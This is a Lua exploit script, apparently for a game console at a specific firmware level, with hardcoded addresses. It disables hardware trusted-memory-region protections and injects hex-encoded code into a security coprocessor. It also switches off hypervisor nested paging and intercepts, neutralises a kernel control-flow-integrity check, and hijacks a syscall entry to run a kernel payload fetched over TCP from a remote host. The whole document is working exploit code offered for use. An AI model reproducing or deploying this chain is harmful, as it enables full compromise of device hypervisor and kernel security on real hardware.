-- injects into mp4 and disables TMR protections for HV range, with some addresses hardcoded
-- stops working at fw 5.00 (iirc) because TMR is no longer directly modifiable by x86
-- have fun!

function round_up_page(val)
    val = force_Uint64(val)
    return lsl(bitfield_extract(val + 0x3fff, 14, 64 - 14), 14)
end

function malloc_mmap(len)
    local neg_1 = Uint64:new(0xffffffff, 0xffffffff)
    local len_aligned = round_up_page(len)
    local buf = call(sym.syscall, syscalls.mmap, 0, len_aligned, 3, 0x1000, neg_1, 0)
    if buf == neg_1 then error('mmap '..errno()) end
    call(sym.bzero, buf, len_aligned)
    return buf
end

function free_mmap(buf, len)
    local len_aligned = round_up_page(len)
    call(sym.syscall, syscalls.munmap, buf, len_aligned)
end

function tcp_file_read(path)
    local fd = tcp_host_open()
    if not fd then return false end

    local CMD_DOWNLOAD_FILE = 1
    local cmd = ub4(CMD_DOWNLOAD_FILE)..tcp_fmt_sized(path)
    local rv = write_all(fd, cmd, #cmd)
    local file_buf, file_len = nil, nil
    if rv then
        local scratch = malloc(4)
        rv = read_all(fd, scratch, 4)
        if rv then
            file_len = r32(scratch)
            file_buf = malloc_mmap(file_len)
            rv = read_all(fd, file_buf, file_len)
        end
    end
    close(fd)
    return rv, file_buf, file_len
end

-- TMR utils
local pcie_cfg_base = Uint64:new(0xF0000000)

function pci_cfg_addr(b, d, f)
    return pcie_cfg_base + b * 0x100000 + d * 0x8000 + f * 0x1000
end

local pci_cfg_b0d18f02 = pci_cfg_addr(0, 0x18, 2)
local tmr_ind_index = pci_cfg_b0d18f02 + 0x80
local tmr_ind_data = pci_cfg_b0d18f02 + 0x84

function tmr_read32(addr)
    pw32(tmr_ind_index, addr)
    return pr32(tmr_ind_data)
end

function tmr_write32(addr, val)
    pw32(tmr_ind_index, addr)
    pw32(tmr_ind_data, val)
end

function tmr_read(index)
    local addr = index * 0x10
    return {
        base = tmr_read32(addr),
        limit = tmr_read32(addr + 4),
        cfg = tmr_read32(addr + 8),
        requestors = tmr_read32(addr + 12),
    }
end

function tmr_add_for_all(index, base, limit)
    local addr = index * 0x10
    tmr_write32(addr + 8, 0)
    tmr_write32(addr + 0, base)
    tmr_write32(addr + 4, limit)
    tmr_write32(addr + 12, 0)
    tmr_write32(addr + 8, 0x3f07)
end

local mp4_bar2_pa = Uint64:new(0xe0400000)

function mp4_p2c_reg_addr(core, reg)
    if core == 0 and reg < 4 then
        return mp4_bar2_pa + 0x10500 + reg * 4
    elseif core == 0 and reg == 4 then
        return mp4_bar2_pa + 0xf0000
    elseif core == 1 and reg < 5 then
        return mp4_bar2_pa + 0xF1000 + reg * 0x1000
    else
        error(string.format('bad p2c reg %d core%d', reg, core))
    end
end

function mp4_c2p_reg_addr(core, reg)
    return mp4_bar2_pa + 0xF6000 + core * 0x5000 + reg * 0x1000
end

function mp4_p2c_read(core, reg)
    return pr32(mp4_p2c_reg_addr(core, reg))
end

function mp4_p2c_write(core, reg, val)
    pw32(mp4_p2c_reg_addr(core, reg), val)
end

function mp4_c2p_read(core, reg)
    return pr32(mp4_c2p_reg_addr(core, reg)).lo
end

function mp4_c2p_write(core, reg, val)
    pw32(mp4_c2p_reg_addr(core, reg), val)
end

function mp4_dump_msg_regs()
    for core=0,1,1 do
        for reg=0,4,1 do
            local val = mp4_p2c_read(core, reg)
            log('p2c core '..core..' reg '..reg..' : '..tostring(val))
        end
    end
    for core=0,1,1 do
        for reg=0,4,1 do
            local val = mp4_c2p_read(core, reg)
            log(string.format('c2p core %d reg %d %08x', core, reg, val))
        end
    end
end

function dvm_mbox_read(index)
    return pr32(mp4_bar2_pa + 0xc0000 + index * 0x1000)
end

function dvm_dump_mbox_regs()
    for i=0,0x2f,1 do
        log('DVM_MAILBOX_'..i..' : '..tostring(dvm_mbox_read(i)))
    end
end

function mp4_log_read(core)
    local log_pa = Uint64:new(0x605f0000 + 0x110000)
    if core ~= 0 then log_pa = log_pa + 0x80000 end
    local offset = pr64(log_pa + 0x208)
    local size = pr64(log_pa + 0x218)
    return pr(log_pa + offset, size)
end

function mp4_log_dump()
    for core=0,1,1 do
        tcp_file_write(string.format('mp4_log.core%d.txt', core), mp4_log_read(core))
    end
end

local mp4_debug_log = false

function mp4_send_cmd(core, cmd, arg1, arg2, arg3, ack)
    if arg1 then mp4_c2p_write(core, 1, arg1) end
    if arg2 then mp4_c2p_write(core, 2, arg2) end
    if arg3 then mp4_c2p_write(core, 3, arg3) end
    if ack then mp4_c2p_write(core, 4, ack) end
    mp4_c2p_write(core, 0, cmd)
    if mp4_debug_log then
        for i=0,0x10,1 do
            tcp_file_write(string.format('mp4_log.core%d.txt', core), mp4_log_read(core))
        end
    end
    local count = 0
    local timeout = 200
    while true do
        local cmd_rb = mp4_c2p_read(core, 0)
        if cmd_rb == 0 then break end
        count = count + 1
        timeout = timeout - 1
        if count > 10 then
            count = 0
            collectgarbage()
        end
        if timeout <= 0 then
            local reg0 = mp4_c2p_read(core, 0)
            local reg1 = mp4_c2p_read(core, 1)
            local reg2 = mp4_c2p_read(core, 2)
            local reg3 = mp4_c2p_read(core, 3)
            local reg4 = mp4_c2p_read(core, 4)
            error(string.format('mp4_send_cmd timeout %08x %08x %08x %08x %08x',
                reg0, reg1, reg2, reg3, reg4))
        end
    end
end

function mp4_result64()
    return Uint64:new(mp4_c2p_read(0, 1), mp4_c2p_read(0, 2))
end

function mp4_ping()
    mp4_send_cmd(0, 0x20400009)
    return mp4_c2p_read(0, 1)
end

function mp4_tlbi()
    mp4_send_cmd(0, 0x20400008)
end

function mp4_r32(addr)
    addr = force_Uint64(addr)
    mp4_send_cmd(0, 0x20400000, addr.lo, addr.hi, 2)
    return mp4_c2p_read(0, 1)
end

--not working (mp4 hang)
function mp4_r32_phys(addr)
    addr = force_Uint64(addr)
    mp4_send_cmd(0, 0x20400000, addr.lo, addr.hi, 4 + 2)
    return mp4_c2p_read(0, 1)
end

function mp4_r64(addr)
    addr = force_Uint64(addr)
    mp4_send_cmd(0, 0x20400000, addr.lo, addr.hi, 3)
    return mp4_result64()
end

function mp4_w32(addr, val)
    addr = force_Uint64(addr)
    mp4_send_cmd(0, 0x20400003, addr.lo, addr.hi, val)
    return mp4_c2p_read(0, 1)
end

function mp4_w64(addr, val)
    addr = force_Uint64(addr)
    val = force_Uint64(val)
    mp4_send_cmd(0, 0x20400004, addr.lo, addr.hi, val.lo, val.hi)
    return mp4_result64()
end

function mp4_syshub_tlb_setup(tlb, addr)
    addr = force_Uint64(addr)
    mp4_send_cmd(0, 0x20400005, addr.lo, addr.hi, tlb)
end

function mp4_cache_enable(enable)
    mp4_send_cmd(0, 0x2040000a, enable)
end

function mp4_reg_read(reg)
    mp4_send_cmd(0, 0x2040000b, reg)
    return mp4_result64()
end

-- args can only be 32bit at the moment
function mp4_memcpy(dst, src, len)
    mp4_send_cmd(0, 0x20400006, dst, src, len)
end

function mp4_dc_civac(addr, len)
    addr = force_Uint64(addr)
    mp4_send_cmd(0, 0x20400007, addr.lo, addr.hi, len, 0)
end

function mp4_dc_ivac(addr, len)
    addr = force_Uint64(addr)
    mp4_send_cmd(0, 0x20400007, addr.lo, addr.hi, len, 1)
end

-- disable tmr20 (mp4 carveout 60000000:605f0000) so x86 can access
local tmr20_cfg = tmr_read32(20 * 0x10 + 8)
tmr_write32(20 * 0x10 + 8, 0)

-- give everything access to tmr16 region (x86 kernel text / hv text/data)
-- TODO could also just disable it?
local tmr16 = tmr_read(16)
tmr_add_for_all(21, tmr16.base, tmr16.limit)

local mp4_thunk = string.fromhex('FD7BBFA99D8C80D27D64A0F21E008012BE0300B91D0082D2FD0FB1F2A0033FD6FD7BC1A8C0035FD6')
pw(Uint64:new(0x60000000 + 0xe0000), mp4_thunk)

local mp4_payload = string.fromhex('07008A52E503022AE603032AA38003AA077C071BC00080520008A4723F00006B20100054C8030054000C00513F00006BE00C0054E8010054000800513F00006BE00B0054000400113F00006BC00B00540008A4523F00006B400500540000805201008CD2E161A0F2E06821B8C0035FD6800080520008A4723F00006BC10A0054000094D2E061A0F2E403042AE06860B8848000AA640000F9F1FFFF17200180520008A4723F00006BA00F005468010054000800513F00006B800C0054000400113F00006BC1FCFF541F870ED59F3F03D5DF3F03D5E2FFFF17400180520008A4723F00006BA00E0054000400113F00006B61FBFF54420F003520C03ED52000001480040012850842D38404103621423BD5220C7AB222421BD502103ED5A40082924400048A04101ED59F3F03D5DF3F03D51F080071C00300541F0C0071C00300541F04007100030054600040398501003403103ED5A40082D24200048A420003AA02101ED59F3F03D5DF3F03D522423BD5210C7A924100218A21421BD501008ED2E161A0F2E06821B82104409100FC60D3E06821B8B2FFFF17010080D2020080D2E4FFFF1760004079E9FFFF17600040B9E7FFFF17600040F9E5FFFF1764000039A7FFFF1764000079A5FFFF17640000B9A3FFFF1784140012840400519FF0007188080054827C7CD36064A0D24100008B0448248B63FC5AD3436820B84202805200008012220400B9E2031EB2220400F980E003B9600080520010B87280D804B98FFFFF17E00305AAE10306AAE403042A840400D19F0400B120F1FF542214403802140038FBFFFF17000094D2E061A0F2E06860B8600100341F04007101F0FF5463E47A92000080529F00006B89EFFF546140208B217608D500000111FBFFFF1763E47A929F00006BA9EEFF546140208B217E0BD500000111FBFFFF17008480D20064A0F2010040B900008ED2E061A0F2E16820B86AFFFF1700103ED5830082925F000071810082D2010001AA0000038A0000819A00101ED57DFFFF17A0019AD2A0D5BBF24059D9F2A0D5FBF2A4FFFF17200080525BFFFF17')
pw(Uint64:new(0x60000000 + 0x7f1000), mp4_payload)

-- 109854   BL mDbg_intr
-- bl <imm26>
local mdbg_branch = 0x109854
local bl_offset = ((0x100000 + 0xe0000) - mdbg_branch) / 4
pw32(0x60000000 + (mdbg_branch - 0x100000), 0x94000000 + bl_offset)

-- enable qaf in mm4p_flags
pw32(0x60000000 + 0x1EC5C, 1)

-- re-enable tmr20. without this, kernel panics when re-starting game process
tmr_write32(20 * 0x10 + 8, tmr20_cfg)

local tmp_tmr5 = tmr_read32(5 * 0x10 + 8)
local tmp_tmr17 = tmr_read32(17 * 0x10 + 8)
local tmp_tmr18 = tmr_read32(18 * 0x10 + 8)

-- disable TMRs on hv region
if not tmr_read32(5 * 0x10 + 8):is_zero() then
    tmr_write32(5 * 0x10 + 8, 0x3f07)
    tmr_write32(17 * 0x10 + 8, 0)
    tmr_write32(18 * 0x10 + 8, 0)
    tmr_write32(5 * 0x10 + 8, 0)
end

--for i=0,21,1 do
--    local tmr = tmr_read(i)
--    log(string.format('tmr %2d %08x %08x %08x %08x', i, tmr.base.lo, tmr.limit.lo, tmr.cfg.lo, tmr.requestors.lo))
--end

--[[]]
local vcpu_ctxs_pa = Uint64:new(0x628485d0)
local vcpu_ctxs_mp4_base = lsl(bitfield_extract(vcpu_ctxs_pa, 26, 64-26), 26)
mp4_syshub_tlb_setup(32, vcpu_ctxs_pa)
mp4_syshub_tlb_setup(33, vcpu_ctxs_pa + 0x04000000)
-- overwrite syshub_tlb_sub_page_rw_cache.sub_page_attrs[n]
-- otherwise the reg will be restored by the cache (depending on fw version, possibly to zero)
mp4_w32(0x11F538 + 0xc + 4 * (32 - 1), 0xffffffff)
mp4_w32(0x11F538 + 0xc + 4 * (33 - 1), 0xffffffff)

function sys_pa_to_mp4_va(sys_pa)
    -- assume the pa is mapped by syshub tlb32/33 which is identity mapped to va
    local offset = sys_pa - vcpu_ctxs_mp4_base
    if offset.lo >= 0x08000000 then error('sys_pa_to_mp4_va') end
    return 0x80000000 + offset
end

local hv_va_base = mp4_r64(sys_pa_to_mp4_va(0x62848000))

for i=0,15,1 do
    collectgarbage()
    local addr = vcpu_ctxs_pa + 0x320 * i + 8
    local addr_mp4_va = sys_pa_to_mp4_va(addr)
    local vmcb_va = mp4_r64(addr_mp4_va)
    local vmcb_pa = vmcb_va - hv_va_base
    local vmcb_mp4_va = sys_pa_to_mp4_va(vmcb_pa)
    local vmcb_90 = mp4_r64(vmcb_mp4_va + 0x90)
    if vmcb_90:is_zero() then
        log('VMCBs already modified, skipping')
        break
    end
    log(string.format('asid1 cpu %4x %s(%s) %s(%s) %s', i,
        tostring(addr), tostring(addr_mp4_va),
        tostring(vmcb_pa), tostring(vmcb_mp4_va), tostring(vmcb_90)))
    if vmcb_90 ~= Uint64:new(9) then
        error('mp4 read fucked up?')
    end
    -- set GMET=0,NP_ENABLE=0
    -- GMET value doesn't really matter if NP_ENABLE=0, but disable anyway
    mp4_w64(vmcb_mp4_va + 0x90, 0)
    local vec0 = mp4_r32(vmcb_mp4_va + 0x00)
    local vec3 = mp4_r32(vmcb_mp4_va + 0x0c)
    local vec4 = mp4_r32(vmcb_mp4_va + 0x10)
    local intercept_cpuid = lsl(bitfield_extract(force_Uint64(vec3), 18, 1), 18)
    -- disable intercepts
    mp4_w32(vmcb_mp4_va + 0x00, 0)
    -- try to preserve cpuid hook setting (although there is a race here and
    -- maybe hook doesn't really matter)
    if vec3 ~= intercept_cpuid then
        mp4_w32(vmcb_mp4_va + 0x0c, intercept_cpuid)
    end
    -- keep VMSAVE, VMLOAD, VMMCALL, VMRUN. without all these, process context
    -- switches may hang for some reason
    mp4_w32(vmcb_mp4_va + 0x10, 0xf)
end
--]]

--[[
local pa = Uint64:new(0x64000000)
tcp_file_write_mem(string.format('physmem_2.50_%s.bin', tostring(pa)),
    Uint64:new(pa.lo, pa.hi + 0x60), 0x04000000)
--]]

--[[]]
local ktext_start_pa = lsl(tmr_read32(16 * 0x10), 16)
local ktext_start_va = pr64(ktext_start_pa + 0x73a3030)

-- make cfi_check_fail a nop
-- TODO? patching code here kinda sucks
local cfi_check_fail_pa = ktext_start_pa + 0x441dd0
-- use mp4 so we dont have to care about page tables
mp4_syshub_tlb_setup(32, cfi_check_fail_pa)
local cfi_check_fail_mp4_va = 0x80000000 + bitfield_extract(cfi_check_fail_pa, 0, 26)
mp4_w32(cfi_check_fail_mp4_va, 0xc3c3c3c3)

local sysvec_va = kr64(kproc + 0x9c0)
local sysent_va = kr64(sysvec_va + 8)

-- note: assume contiguous
local sysent_8_va = sysent_va + 0x30 * 8
local sysent_8_pa = get_pa(sysent_8_va)
local sysent_8_call_pa = sysent_8_pa + 8

--local kernel_payload = string.fromhex('488b06c3')
--local kernel_payload_uva = malloc_mmap(#kernel_payload)
--memcpy(kernel_payload_uva, kernel_payload, #kernel_payload)
local rv, file_buf, file_len = tcp_file_read('/../../kpayload/kpayload')
if not rv then error('failed to load file') end
local kernel_payload = r(file_buf, file_len)
local kernel_payload_uva = file_buf
local kernel_payload_pa = get_pa(kernel_payload_uva)

-- map payload with 1G at 0xffffffc0_00000000 as rwx
-- the mapping should only be used for the duration of the call
-- may not actually be contiguous, so the payload should use the user mapping to copy itself
local kernel_payload_kva = Uint64:new(0, 0xffffffc0) + bitfield_extract(kernel_payload_pa, 0, 30)
local pdp_pa = lsl(bitfield_extract(pr64(kpml4_pa + 0xff8), 12, 52-12), 12)
local pdpe_pa = pdp_pa + 0x800
if not pr64(pdpe_pa):is_zero() then error('pdpe taken') end
pw64(pdpe_pa, lsl(bitfield_extract(kernel_payload_pa, 30, 52-30), 30) + 0x83)

-- make sysent page writable
local pte_pa, pte = get_pte_ptr(sysent_8_va)
local pte_w = bitfield_extract(pte, 1, 1)
if pte_w.lo ~= 1 then pw64(pte_pa, pte + 2) end

-- invoke it from kernel
local sysent_8_call_orig = pr64(sysent_8_call_pa)
pw32(sysent_8_pa, 8) -- num syscall args
pw64(sysent_8_call_pa, kernel_payload_kva)
local rv = call(sym.syscall, 8, ktext_start_va, kernel_payload_uva, tcp_host_addr, 0)
local timeout = make_timeval(20, 0)
call(sym.syscall, syscalls.nanosleep, timeout, 0)
local rv = call(sym.syscall, 8, ktext_start_va, kernel_payload_uva, tcp_host_addr, 1)
local timeout = make_timeval(20, 0)
call(sym.syscall, syscalls.nanosleep, timeout, 0)
local rv = call(sym.syscall, 8, ktext_start_va, kernel_payload_uva, tcp_host_addr, 2)
local timeout = make_timeval(20, 0)
call(sym.syscall, syscalls.nanosleep, timeout, 0)
local rv = call(sym.syscall, 8, ktext_start_va, kernel_payload_uva, tcp_host_addr, 3)
local timeout = make_timeval(20, 0)
call(sym.syscall, syscalls.nanosleep, timeout, 0)

pw32(sysent_8_pa, 0)
pw64(sysent_8_call_pa, sysent_8_call_orig)

-- not strictly required, just for sanity
pw64(pte_pa, pte)
pw64(pdpe_pa, 0)

free_mmap(kernel_payload_uva, #kernel_payload)
--]]

log('kpayload rv '..tostring(rv)..' '..errno())

--mp4_dump_msg_regs()
--dvm_dump_mbox_regs()
--mp4_log_dump()

-- give access to tmr19 so we can stash stuff there
-- XXX disabling it causes psp panic on app launch
--local tmr19 = tmr_read(19)
--tmr_add_for_all(22, tmr19.base, tmr19.limit)

tmr_write32(5 * 0x10 + 8, 0x3f07)
tmr_write32(17 * 0x10 + 8, tmp_tmr17)
tmr_write32(18 * 0x10 + 8, tmp_tmr18)
tmr_write32(5 * 0x10 + 8, tmp_tmr5)

log('done')
